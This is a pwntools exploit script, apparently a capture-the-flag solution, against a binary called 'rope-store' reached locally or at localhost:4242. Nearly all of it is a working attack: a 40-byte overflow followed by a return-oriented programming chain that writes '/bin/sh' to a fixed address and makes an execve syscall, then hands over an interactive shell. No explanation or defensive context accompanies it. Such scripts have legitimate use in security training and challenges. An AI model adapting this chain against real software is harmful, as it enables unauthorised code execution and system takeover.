#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("./rope-store")
context.arch = 'amd64'
#context.terminal = ['tmux','splitw','-h']

def start():
    if args.GDB:
        return gdb.debug(elf.path)
    if args.REMOTE:
        return remote("localhost", 4242)
    else:
        return process(elf.path)

p = start()

padding = 40*b"A"
pop_rdi_ret = p64(0x000000000040204f)
pop_rsi_ret = p64(0x000000000040a0be)
pop_rdx_pop_rbx_ret = p64(0x000000000048600b)
syscall = p64(0x0000000000401e04)
mov_ptr_rdi_edx = p64(0x0000000000434444)  
pop_rax = p64(0x00000000004515b7)
ret = p64(0x000000000040101a)

location = 0x4c5010
bsh1 = b"/bin" + p32(0)
bsh2 = b"/sh\0" +  p32(0)

payload = padding + pop_rdi_ret + p64(location) + pop_rdx_pop_rbx_ret + bsh1 + p64(0xdeadbeef) + mov_ptr_rdi_edx + pop_rdi_ret + p64(location+4) + pop_rdx_pop_rbx_ret + bsh2 + p64(0xdeadbeef) + mov_ptr_rdi_edx
payload += pop_rax + p64(0x3b) + pop_rdi_ret + p64(location) + pop_rsi_ret + p64(0) + pop_rdx_pop_rbx_ret + p64(0) + p64(0) + syscall

p.sendline(payload)

p.interactive()

